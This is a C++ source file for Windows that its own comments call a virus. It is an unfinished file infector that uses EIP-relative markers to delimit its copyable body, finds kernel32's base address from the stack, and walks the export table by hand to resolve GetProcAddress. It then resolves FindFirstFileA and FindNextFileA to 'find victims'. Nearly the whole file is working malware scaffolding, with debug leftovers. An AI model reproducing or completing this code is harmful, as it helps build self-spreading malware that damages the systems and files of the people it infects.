#include "utils.hpp"

#include <windows.h> //TODO Header can generate entities. Check it

TYPE_SIZE getEIP();
void start();

//====================================================================================================
int main() {
	//some debug stuff can be placed here
	auto pKernel32 = GetModuleHandle("kernel32.dll");

	__asm {//using inline asm just to debug code
		push pKernel32
	}
	
	//Call main virus function
	start();
}

//####################################################################################################
//####################################################################################################
TYPE_SIZE MARKER_BODYBEGIN() {
	TYPE_SIZE curEIP = getEIP();
	const TYPE_SIZE offsetTillFuncBegin = 0x9;
	return curEIP - offsetTillFuncBegin;
}

//Include point
#include "dynamic_utils.hpp"

//====================================================================================================
TYPE_SIZE getEIP() {
	TYPE_SIZE stackCanary;
	TYPE_SIZE* stackIter = &stackCanary;
	return stackIter[3];
}

//====================================================================================================
TYPE_SIZE MARKER_MARKEREXAMPLE() {
	TYPE_SIZE curEIP = getEIP();
	const TYPE_SIZE offsetTillFuncBegin = 0x9;
	return curEIP - offsetTillFuncBegin;
}

//====================================================================================================
bool checkIsPE(TYPE_SIZE addr) {
	if (((char*)addr)[0] != 'M' && ((char*)addr)[1] != 'Z') return false; //TODO decltype('c')* ~ char*
	addr +=((_IMAGE_DOS_HEADER*)addr)->e_lfanew;
	if (((char*)addr)[0] != 'P' && ((char*)addr)[1] != 'E') return false;
	return true;
}

//====================================================================================================
TYPE_SIZE getPEImageBase(TYPE_SIZE addressSomewhereInModule) {
	addressSomewhereInModule &= 0xFFFF0000;
	while (false == checkIsPE(addressSomewhereInModule)) { addressSomewhereInModule -= 0x10000; }
	return addressSomewhereInModule;
}

//====================================================================================================
void start() {
	//Stack here:
	//...		dataObject
	//+0x8/0x10	stackIter
	//+0x4/0x8	Function stack frame ptr (ebp/rbp)
	//0x0		kernel32_addr

	TYPE_SIZE stackIter[1] = {0};//TODO remove unnecessary initializer
	CVirusData dataObject;

	//Get addr somewhere in kernel32 from stack
	auto addrSomewhereInKernel32 = stackIter[4]; //TODO what the fuck is going here - addrSomewhereInKernel32 sometimes invalid
	//Get kernel32 base addr
	TYPE_SIZE kernel32Addr = getPEImageBase(addrSomewhereInKernel32);

	//Acquire kernel32 funcs addresses
	//Aquire GetProcAddress addr
	auto MainPESignatureOffset = ((IMAGE_DOS_HEADER*)kernel32Addr)->e_lfanew;
	auto MainPESignatureOffsetAddr = kernel32Addr + MainPESignatureOffset;

	auto OptionalPEHeaderAddr = MainPESignatureOffsetAddr + sizeof(IMAGE_FILE_HEADER) + sizeof(IMAGE_NT_HEADERS::Signature);

	auto imageDataDirExportAddr = ((IMAGE_OPTIONAL_HEADER*)OptionalPEHeaderAddr)->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress+kernel32Addr;
	auto pExportFuncsNames = ((IMAGE_EXPORT_DIRECTORY*)imageDataDirExportAddr)->AddressOfNames + kernel32Addr;

	TYPE_SIZE i = 0;
	do{
		auto curFuncNameAddr = kernel32Addr + ((TYPE_SIZE*)pExportFuncsNames)[i];
		if (strcmp((TYPE_BYTE*)curFuncNameAddr, (TYPE_BYTE*)dataObject.funcname_GetProcAddress) == true) { break; }
	} while (++i);
	auto getProcAddrOrdinal = ((TYPE_WORD*)(((IMAGE_EXPORT_DIRECTORY*)imageDataDirExportAddr)->AddressOfNameOrdinals + kernel32Addr))[i];
	dataObject.addr_GetProcAddress = (decltype(dataObject.addr_GetProcAddress))((unsigned)((TYPE_SIZE*)( ((IMAGE_EXPORT_DIRECTORY*)imageDataDirExportAddr)->AddressOfFunctions + kernel32Addr) )[getProcAddrOrdinal]+kernel32Addr);
	
	//Find victims (FindFirstFile/FindNextFile)
	dataObject.addr_FindFirstFileA = (decltype(dataObject.addr_FindFirstFileA))dataObject.addr_GetProcAddress((HMODULE)kernel32Addr, dataObject.funcname_FindFirstFileA);
	dataObject.addr_FindNextFileA = (decltype(dataObject.addr_FindNextFileA))dataObject.addr_GetProcAddress((HMODULE)kernel32Addr, dataObject.funcname_FindNextFileA);
	
	kernel32Addr++; //TODO statement for debug; remove
}

//====================================================================================================
TYPE_SIZE MARKER_BODYEND() {
	TYPE_SIZE curEIP = getEIP();
	const TYPE_SIZE offsetTillFuncEnd = 0x14;
	return curEIP + offsetTillFuncEnd;
}

//####################################################################################################
//####################################################################################################